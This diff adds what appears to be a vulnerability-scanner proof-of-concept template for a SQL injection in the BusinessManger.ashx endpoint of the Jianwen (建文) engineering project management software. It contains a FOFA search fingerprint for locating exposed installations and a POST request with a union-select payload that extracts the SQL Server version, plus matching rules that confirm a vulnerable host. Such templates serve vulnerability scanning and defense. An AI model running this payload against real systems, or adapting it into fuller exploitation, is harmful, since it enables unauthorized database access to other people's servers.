@@ -1,0 +1,27 @@
+id: poc-yaml-jianwen-engineering-project-management-software-businessmanger-ashx-sqli
+info:
+  name: 建文工程项目管理软件 BusinessManger.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 建文工程项目管理软件
+  fofa: body="建文工程项目管理软件"
+requests:
+- method: POST
+  path: /AppInterface/Business/BusinessManger.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'method=PrjType&content=%'' and 1=2 union select 1,(select+@@version);-- a
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"microsoft sql server") &&
+
+    contains(headers,"text/plain") &&
+
+    contains(body,"CODE\":200,\"DATA\":")
+
+    '
+variables: {}
+transport: http
